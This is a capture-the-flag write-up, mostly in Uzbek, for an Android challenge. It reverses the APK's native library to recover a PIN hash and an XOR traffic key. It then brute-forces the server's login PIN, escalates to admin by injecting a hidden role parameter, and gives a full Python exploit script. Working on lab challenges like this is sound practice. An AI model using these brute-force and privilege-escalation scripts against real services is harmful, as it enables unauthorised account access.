# CryptoVault

| Field | Value |
|-------|-------|
| Category | Mobile |
| Points | ? |

## Description

> A suspicious Android vault application has been intercepted.
> It combines Android reversing with a web exploitation component.
> Analyze the APK and exploit the backend to retrieve the flag.

## Solution

# 🔓 CryptoVault CTF — Writeup

> **Challenge:** CryptoVault  
> **Difficulty:** Hard  
> **Category:** Android Reverse Engineering + Web Exploitation

---

## Challenge Description

> *CryptoVault — xavfsiz bulutli saqlash ilovasi. Vault ichidagi maxfiy ma'lumotni toping.*  
> **Flag formati:** `CHC{...}`

Bizga `CryptoVault.apk` fayl va ulanish uchun server manzili berilgan. Ilova oddiy ko'rinishda — PIN bilan himoyalangan vault. Lekin ichida 5 bosqichli zanjir yashiringan. Barchasini yechib, server dan flagni olish kerak.

---

## Bosqich 1: Local PIN Brute-Force

### 1.1 APK ni decompile qilish

```bash
jadx CryptoVault.apk -d output/
```

### 1.2 PinActivity ni tahlil qilish

`PinActivity.java` ni ochsak, 4 xonali PIN kiritish va native funksiya orqali tekshirishni ko'ramiz:

```java
public class PinActivity extends AppCompatActivity {
    public native boolean a(String pin);
    // ...
    if (a(pin)) {
        // PIN to'g'ri → ConnectActivity ga o'tish
    }
}
```

PIN tekshiruvi native `.so` faylda. `a()` funksiyasi PIN ni oladi va boolean qaytaradi.

### 1.3 Native library ni reverse qilish

APK ni unzip qilib, `lib/x86_64/libvaultcore.so` ni **Ghidra** da ochamiz.

`Java_com_ctf_cryptovault_PinActivity_a` funksiyasini topsak:

```c
static const char _ph[] = "f7f7b664724bce5c7c5ec139634d8f5557fa1693090c19b400236d4e6cb6779c";

jboolean PinActivity_a(JNIEnv *env, jobject, jstring pin) {
    const char *p = env->GetStringUTFChars(pin, 0);
    char hash[65];
    sha256(p, hash);        // PIN ni SHA-256 hash qiladi
    return strcmp(hash, _ph) == 0;  // Hardcoded hash bilan solishtiradi
}
```

> [!IMPORTANT]
> PIN `SHA-256` hash sifatida saqlanadi: `f7f7b664724bce5c7c5ec139634d8f5557fa1693090c19b400236d4e6cb6779c`

### 1.4 PIN ni brute-force qilish

Faqat 10,000 ta variant (0000-9999). Python bilan tezda topamiz:

```python
import hashlib

target = "f7f7b664724bce5c7c5ec139634d8f5557fa1693090c19b400236d4e6cb6779c"

for i in range(10000):
    pin = f"{i:04d}"
    if hashlib.sha256(pin.encode()).hexdigest() == target:
        print(f"✅ PIN topildi: {pin}")
        break
```

**Natija: PIN = `7293`**

---

## Bosqich 2: Server ga ulanish

PIN kiritgandan so'ng, ilova server IP va PORT so'raydi.

### 2.1 ConnectActivity logikasi

```java
NetHelper net = new NetHelper(ip, port);
String resp = net.post("b2f5", "{}");  // Handshake endpoint
JSONObject json = new JSONObject(resp);
String ht = json.getString("h");       // Handshake token
```

Bu yerda muhim narsa — ilova serverga HTTP so'rov yuboradi, lekin **oddiy HTTP emas**!

### 2.2 XOR Encoding

`NetHelper.java` ni o'qisak, barcha request va response body larini **native funksiya** orqali encoding qilishini ko'ramiz:

```java
public class NetHelper {
    public native byte[] b(byte[] data);  // XOR transform

    private String enc(String json) {
        byte[] xored = b(json.getBytes());   // XOR encode
        return Base64.encodeToString(xored, Base64.NO_WRAP);  // → Base64
    }

    private String dec(String data) {
        byte[] raw = Base64.decode(data, Base64.NO_WRAP);  // Base64 decode
        byte[] xored = b(raw);              // XOR decode
        return new String(xored);
    }
}
```

> [!IMPORTANT]
> **Barcha HTTP traffic XOR + Base64 bilan himoyalangan.** Burp Suite da oddiy JSON ko'rinmaydi — faqat Base64 encoded gibberish!

### 2.3 XOR kalitni topish

Ghidra da `Java_com_ctf_cryptovault_NetHelper_b` funksiyasini ochsak:

```c
static const unsigned char _xk[] = {
    0xA7, 0x3F, 0x8B, 0xC2, 0x59, 0xE1, 0x7D, 0x44, 0xF6, 0x18
};
// Her byte ni _xk bilan XOR qiladi (kalit takrorlanadi)
```

**XOR key: `[0xA7, 0x3F, 0x8B, 0xC2, 0x59, 0xE1, 0x7D, 0x44, 0xF6, 0x18]`** (10 bytes)

### 2.4 Python helper yozish

Endi biz o'zimiz server bilan aloqa qila olamiz:

```python
import base64, json, requests

XK = bytes([0xA7, 0x3F, 0x8B, 0xC2, 0x59, 0xE1, 0x7D, 0x44, 0xF6, 0x18])

def xor_transform(data: bytes) -> bytes:
    return bytes([data[i] ^ XK[i % len(XK)] for i in range(len(data))])

def enc(json_str: str) -> str:
    return base64.b64encode(xor_transform(json_str.encode())).decode()

def dec(b64_str: str) -> str:
    return xor_transform(base64.b64decode(b64_str)).decode()

SERVER = "http://IP:PORT"
```

### 2.5 Handshake

```python
r = requests.post(f"{SERVER}/b2f5", data=enc("{}"))
handshake = json.loads(dec(r.text))
HT = handshake["h"]
print(f"Handshake token: {HT}")
```

---

## Bosqich 3: Server Login — Parol Brute-Force

### 3.1 LoginActivity tahlili

```java
String body = "{\"u\":\"" + u + "\",\"p\":\"" + p + "\"}";
String resp = net.post("d8a3", body);  // Login endpoint
```

Login endpoint: `POST /d8a3`
- Request: `{"u": "user", "p": "<4-digit>"}` (XOR + Base64)
- Header: `X-HT: <handshake_token>`
- Muvaffaqiyatli: `{"t": "<JWT_token>", "r": 1}`
- Xato: `{"e": 3}`

### 3.2 Server parolni brute-force
Brute-force:

```python
headers = {"X-HT": HT}

for pin in range(1000, 10000):
    body = json.dumps({"u": "user", "p": str(pin)})
    r = requests.post(f"{SERVER}/d8a3", data=enc(body), headers=headers)
    resp = json.loads(dec(r.text))
    
    if "t" in resp:
        TOKEN = resp["t"]
        ROLE = resp["r"]
        PASS = str(pin)
        print(f"✅ Server PIN: {pin}")
        print(f"   Token: {TOKEN[:30]}...")
        print(f"   Role ID: {ROLE}")
        break
```

---

## Bosqich 4: Privilege Escalation (IDOR)

Bu eng qiyin va hal qiluvchi bosqich! Login qilgandan keyin `DashboardActivity` ochiladi.

### 4.1 Dashboard tahlili

Ekranda ko'rsatiladi:
```
Welcome, user
Role: User (ID: 1)
```

**`Role ID: 1`** — bu muhim clue! Demak boshqa role ID lar ham bor.

### 4.2 Get Flag tugmasi

"Get Secret" tugmasini bossak:

```java
String resp = net.post("f1c9", "{}");  // Get flag endpoint
// Authorization: Bearer <token> header bilan
```

**Natija:** `{"e": "permission denied"}` ❌

User token bilan flag olish mumkin emas. **Admin** token kerak!

### 4.3 Change Password tahlili

"Change Password" funksiyasini ko'ramiz:

```java
String body = "{\"u\":\"" + user + "\",\"op\":\"" + oldP + "\",\"np\":\"" + newP + "\"}";
String resp = net.post("e4b7", body);
// Response: {"s": 1, "r": 1, "t": "new_jwt_token"}
```

Response da `"r": 1` qaytayapti — bu bizning role ID. **Qiziq!**

### 4.4 Hidden parameter kashfiyoti

Server kodini bilmasak ham, mantiqiy savollar tug'iladi:
- Response da `role_id` bor → ehtimol request da ham qabul qiladimi?
- `r: 1` = user → `r: 100` = admin bo'ladimi?

Bu **Mass Assignment / IDOR** vulnerability:

```python
headers = {"X-HT": HT, "Authorization": f"Bearer {TOKEN}"}

# role_id=100 ni request body ga qo'shamiz
body = json.dumps({
    "u": "user",
    "op": PASS,
    "np": "9999",
    "r": 100          # ← HIDDEN PARAMETER!
})

r = requests.post(f"{SERVER}/e4b7", data=enc(body), headers=headers)
resp = json.loads(dec(r.text))
print(resp)
# {"s": 1, "r": 100, "t": "admin_jwt_token"}
```

**Bingo!**  `"r": 100` — biz endi **Admin** miz!

```python
ADMIN_TOKEN = resp["t"]
PASS = "9999"  # Parol o'zgardi
```

> [!NOTE]
> Agar 100 ni bilmasak, brute-force qilamiz:
> ```python
> for rid in range(1, 201):
>     body = json.dumps({"u":"user", "op":PASS, "np":"9999", "r": rid})
>     r = requests.post(..., data=enc(body), headers=headers)
>     resp = json.loads(dec(r.text))
>     if resp.get("r") == rid and rid != 1:
>         print(f"Admin role_id: {rid}")
>         break
>     # Parolni qaytarish
>     body2 = json.dumps({"u":"user", "op":"9999", "np":PASS})
>     requests.post(..., data=enc(body2), headers=headers)
> ```

---

## Bosqich 5: Flag olish

Endi admin token bilan flagni olamiz:

```python
headers = {"X-HT": HT, "Authorization": f"Bearer {ADMIN_TOKEN}"}

r = requests.post(f"{SERVER}/f1c9", data=enc("{}"), headers=headers)
resp = json.loads(dec(r.text))

if "f" in resp:
    print(f"\n🏁 FLAG: {resp['f']}")
else:
    print(f"Error: {resp}")
```

**Natija:**
```
FLAG: CHC{a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6}
```

---

## To'liq Exploit Script

```python
#!/usr/bin/env python3
"""CryptoVault CTF — Full Exploit"""

import base64, json, hashlib, requests, sys

# ── Config ──
XK = bytes([0xA7, 0x3F, 0x8B, 0xC2, 0x59, 0xE1, 0x7D, 0x44, 0xF6, 0x18])
LOCAL_PIN_HASH = "f7f7b664724bce5c7c5ec139634d8f5557fa1693090c19b400236d4e6cb6779c"

def xor(data):
    return bytes([data[i] ^ XK[i % len(XK)] for i in range(len(data))])

def enc(s):
    return base64.b64encode(xor(s.encode())).decode()

def dec(s):
    return xor(base64.b64decode(s)).decode()

if len(sys.argv) < 3:
    print("Usage: python exploit.py <IP> <PORT>")
    sys.exit(1)

SERVER = f"http://{sys.argv[1]}:{sys.argv[2]}"

# ── Stage 1: Local PIN ──
print("[*] Stage 1: Local PIN brute-force...")
for i in range(10000):
    if hashlib.sha256(f"{i:04d}".encode()).hexdigest() == LOCAL_PIN_HASH:
        print(f"[+] Local PIN: {i:04d}")
        break

# ── Stage 2: Handshake ──
print("[*] Stage 2: Handshake...")
r = requests.post(f"{SERVER}/b2f5", data=enc("{}"))
HT = json.loads(dec(r.text))["h"]
print(f"[+] Handshake token: {HT[:16]}...")

# ── Stage 3: Server PIN brute-force ──
print("[*] Stage 3: Server PIN brute-force...")
hdr = {"X-HT": HT}
TOKEN = PASS = None
for pin in range(1000, 10000):
    body = json.dumps({"u": "user", "p": str(pin)})
    r = requests.post(f"{SERVER}/d8a3", data=enc(body), headers=hdr)
    resp = json.loads(dec(r.text))
    if "t" in resp:
        TOKEN, PASS = resp["t"], str(pin)
        print(f"[+] Server PIN: {pin}")
        break

# ── Stage 4: Privilege Escalation ──
print("[*] Stage 4: Escalating to admin (role_id=100)...")
hdr["Authorization"] = f"Bearer {TOKEN}"
body = json.dumps({"u": "user", "op": PASS, "np": "9999", "r": 100})
r = requests.post(f"{SERVER}/e4b7", data=enc(body), headers=hdr)
resp = json.loads(dec(r.text))
ADMIN_TOKEN = resp["t"]
print(f"[+] Admin! Role: {resp['r']}")

# ── Stage 5: Get Flag ──
print("[*] Stage 5: Getting flag...")
hdr["Authorization"] = f"Bearer {ADMIN_TOKEN}"
r = requests.post(f"{SERVER}/f1c9", data=enc("{}"), headers=hdr)
flag = json.loads(dec(r.text))["f"]
print(f"\n[🏁] FLAG: {flag}")
```

## Flag

`CHC{...}`
